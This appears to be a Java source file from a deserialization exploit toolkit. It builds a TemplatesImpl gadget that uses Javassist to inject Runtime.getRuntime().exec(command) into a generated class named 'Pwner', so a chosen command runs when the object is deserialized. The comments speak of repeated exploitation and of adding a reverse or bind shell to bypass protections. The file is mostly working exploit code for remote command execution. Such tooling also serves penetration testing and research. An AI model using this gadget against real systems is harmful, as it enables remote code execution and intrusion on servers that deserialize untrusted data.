package org.example.my4unser.utils;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import java.io.Serializable;

public class Gadgets {
    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }
    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
//        StubTransletPayload(){
//            super.namesArray = new String[0];
//        }
        private static final long serialVersionUID = -5971610431559700674L;
        // clear error for echo
//        protected String[] namesArray = new String[0];//向下转型，需要改super


        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }


        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }
    public static Object createTemplatesImpl(final String command) throws Exception {

        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }

    public static <T> T createTemplatesImpl(final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
        final T templates = tplClass.newInstance();
        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
        // run command in static initializer
        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
            command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
            "\");";
        System.out.println("cmd:"+cmd);
//        clazz.makeClassInitializer().insertBefore("super.namesArray = new String[0];");//初始化之前不能使用super,this
        clazz.makeClassInitializer().insertAfter(cmd);
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        clazz.setName("my4unser.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);
        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
            classBytes, ClassFiles.classAsBytes(Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }
}
